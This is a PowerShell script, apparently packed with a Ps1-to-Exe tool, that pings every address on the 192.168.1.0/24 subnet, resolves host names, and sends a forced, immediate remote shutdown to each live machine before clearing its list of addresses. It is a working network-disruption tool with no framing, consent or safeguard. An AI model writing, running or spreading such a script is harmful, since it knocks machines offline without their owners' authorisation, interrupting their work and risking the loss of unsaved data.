##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uK1
##Nc3NCtDXThU=
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4tI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ4tI=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlaDjqfG5iZk2UfrTWYqfMGUhZKi14qo8PrQiC3MXbQRXWhEnjzoKk6pF/cKUJU=
##Kc/BRM3KXhU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
$ipAddresses = @()
for ($i = 1; $i -le 254; $i++) {
    $ip = "192.168.1.$i"
    $pingResult = $(ping -c 1 -W 1 $ip 2>&1)
    if ($pingResult -match "1 received") {
        $ipAddresses += $ip
    }
}

Set-Content -Path "Ips.txt" -Value $ipAddresses

foreach ($ip in $ipAddresses) {
    $pingResult = $(ping -c 1 -W 1 $ip 2>&1)
    if ($pingResult -match "1 received") {
        $computerName = $(nslookup $ip | Select-String "name =" | Out-String).Trim() -replace ".*name = ([^\.]*)\..*", '$1'
        if ($computerName) {
            $(shutdown -s -f -t 0 -m \\$computerName)
        } else {
            Write-Warning "Could not resolve computer name for IP address $ip"
        }
    } else {
        Write-Warning "Could not connect to IP address $ip"
    }
}

Clear-Content "Ips.txt"